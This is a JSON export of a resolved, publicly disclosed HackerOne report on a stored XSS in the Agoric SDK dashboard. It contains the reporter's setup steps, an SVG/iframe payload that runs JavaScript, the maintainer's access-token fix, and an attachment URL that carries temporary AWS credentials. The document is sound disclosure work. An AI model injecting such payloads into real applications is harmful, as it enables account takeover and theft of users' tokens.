{"id":980412,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODA0MTI=","url":"https://hackerone.com/reports/980412","title":"Stored XSS in agoric-sdk - malicious iframes, malicious svg","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-09-12T00:41:10.279Z","submitted_at":"2020-09-12T00:41:10.323Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sickcodes","url":"/sickcodes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":37451,"url":"https://hackerone.com/agoric","handle":"agoric","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/037/451/1af2202e5e7ee9659e20fc7903a1ee824ca826e0_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/451/1af2202e5e7ee9659e20fc7903a1ee824ca826e0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Agoric","twitter_handle":"agoric","website":"http://agoric.com","about":"Founded by pioneers in secure distributed systems, Agoric uses a secure subset of JavaScript to enable object capabilities and smart contracts."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-28T17:44:01.219Z","bug_reporter_agreed_on_going_public_at":"2020-10-27T05:33:31.982Z","team_member_agreed_on_going_public_at":"2020-10-28T17:44:01.080Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n[add summary of the vulnerability]\n\n## Steps To Reproduce:\n```shell\ngit clone https://github.com/Agoric/agoric-sdk.git\n\ncd agoric-sdk\n\n# yarn config set \"strict-ssl\" false -g\n# yarn config set \"registry\" \"http://registry.npmjs.org/\" -g\n# yarn config set \"cafile\" \"/etc/ssl/cert.pem\" -g\n\npipenv shell\n\nyarn install\nyarn build\n\nyarn link-cli ~/bin/agoric\n\nexport PATH=$PATH:/home/user/bin\n\nagoric init foo\n\ncd foo\n\nagoric install\n\nagoric start\n```\n\nOnce you have an agoric SDK dashboard running, head to localhost:8000\n\nEnter something like this into the command box:\n```\n\u003csvg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003crect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /\u003e\u003cscript type=\"text/javascript\"\u003ealert(\"XSS\");\u003c/script\u003e\u003ciframe srcdoc=\"\u003cimg src=1 onerror=alert(1)\u003e\"\u003e\u003c/iframe\u003e\u003c/svg\u003e\u003c/body\u003e\n\n\n```\n## Supporting Material/References:\n\nVideo attached\n\n## Impact\n\nArbitrary JavaScript execution\nAccount take over\nForce a user to spend their tokens\nYou can store malicious scripts that would open when another user accesses the dashboard over the network.","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-26T05:33:32.038Z","allow_singular_disclosure_after":-27598470.50649603,"singular_disclosure_allowed":true,"vote_count":2,"voters":["mzfr","badcracker"],"severity":{"rating":"high","score":8.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":53881,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/Agoric/agoric-sdk","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9199269,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My user account is user, replace the above export path with `$USER` as appropriate ","automated_response":false,"created_at":"2020-09-12T01:27:26.353Z","updated_at":"2020-09-12T01:27:26.353Z","actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9199478,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please redact/remove the video if you end up publishing this as it has PII in it :)","automated_response":false,"created_at":"2020-09-12T02:56:26.748Z","updated_at":"2020-09-12T02:56:26.748Z","actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9203386,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Well done!  I thought I had handled XSS before, but it appears that my HTML defanging isn't applied properly to tags other than the first.\n\nLooking into a solution,\nMichael.","automated_response":false,"created_at":"2020-09-12T16:59:14.711Z","updated_at":"2020-09-12T16:59:14.711Z","actor":{"username":"mfig","cleared":false,"url":"/mfig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFPQBYexBy34Ukate8Xwcvrq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9203514,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you have a Github account, please LMK what it is, and I will add you to: https://github.com/Agoric/agoric-sdk/security/advisories/GHSA-r4q2-vhj4-c9w3 so you get some public credit once we release!","automated_response":false,"created_at":"2020-09-12T17:13:45.230Z","updated_at":"2020-09-12T17:19:11.669Z","actor":{"username":"mfig","cleared":false,"url":"/mfig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFPQBYexBy34Ukate8Xwcvrq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9203550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks :) \n\nhttps://github.com/sickcodes\n\nhttps://twitter.com/sickcodes\n\nBut please if it goes public can we remove the video from this chat? I'm not sure if I can because I'm new on hackerone ðŸ˜…","automated_response":false,"created_at":"2020-09-12T17:21:08.280Z","updated_at":"2020-09-12T17:21:08.280Z","actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9203556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The video is redacted.","automated_response":false,"created_at":"2020-09-12T17:24:03.130Z","updated_at":"2020-09-12T17:24:03.130Z","actor":{"username":"mfig","cleared":false,"url":"/mfig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFPQBYexBy34Ukate8Xwcvrq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9203599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, thanks for that! I'll let you know if I find any more bugs.\n\nThanks for replying so quickly, and on the weekend too.\n","automated_response":false,"created_at":"2020-09-12T17:30:27.884Z","updated_at":"2020-09-12T17:30:27.884Z","actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9208430,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This report actually revealed a much more important problem: we previously did not verify that the web user was the same as the one who launched `agoric start`.  We've now solved this general problem by keeping an accessToken database in `~/.agoric` (whose permission is 0700), and requiring people to run `agoric open` as that user to launch the wallet page with the correct accessToken.  Missing or non-matching accessTokens are denied.\n\nWould greatly appreciate validation of this new feature, which has landed in https://github.com/Agoric/agoric-sdk/\n","automated_response":false,"created_at":"2020-09-13T18:44:36.478Z","updated_at":"2020-09-13T18:47:48.962Z","actor":{"username":"mfig","cleared":false,"url":"/mfig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFPQBYexBy34Ukate8Xwcvrq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sickcodes","url":"/sickcodes"},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9208527,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No worries, giving it a retest now! Thanks for the review :)","automated_response":false,"created_at":"2020-09-13T19:26:00.945Z","updated_at":"2020-09-13T19:26:00.945Z","actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9208569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"XSS looks all fine now, image attached.\n\nHere's my updated commands to run, and open wallet:\n\n```bash\n...\nagoric install\n\nnohup agoric start \u0026\n\n# might need a sleep here before init wallet is ready?\nagoric open --repl\n```\n\n","automated_response":false,"created_at":"2020-09-13T19:42:13.438Z","updated_at":"2020-09-13T19:42:13.438Z","actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":986750,"filename":"Screenshot_2020-09-13_19-31-56.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ckfTtAxSJnDFw7jqsTuip8gN?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-09-13_19-31-56.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-09-13_19-31-56.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=52dcd1794e7975f1d8625af604aba9da428a978156e0371b562293ccbc87c86c"}],"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9643558,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-27T05:33:32.004Z","updated_at":"2020-10-27T05:33:32.004Z","first_to_agree":true,"actor":{"username":"sickcodes","cleared":false,"url":"/sickcodes","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yhqjS3Lp1zFH9fw8UdN1WUFh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9662666,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We're now publically disclosing.","automated_response":false,"created_at":"2020-10-28T17:44:01.104Z","updated_at":"2020-10-28T17:44:01.104Z","actor":{"username":"mfig","cleared":false,"url":"/mfig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFPQBYexBy34Ukate8Xwcvrq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9662667,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-28T17:44:01.241Z","updated_at":"2020-10-28T17:44:01.241Z","actor":{"username":"mfig","cleared":false,"url":"/mfig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RFPQBYexBy34Ukate8Xwcvrq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"agoric","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}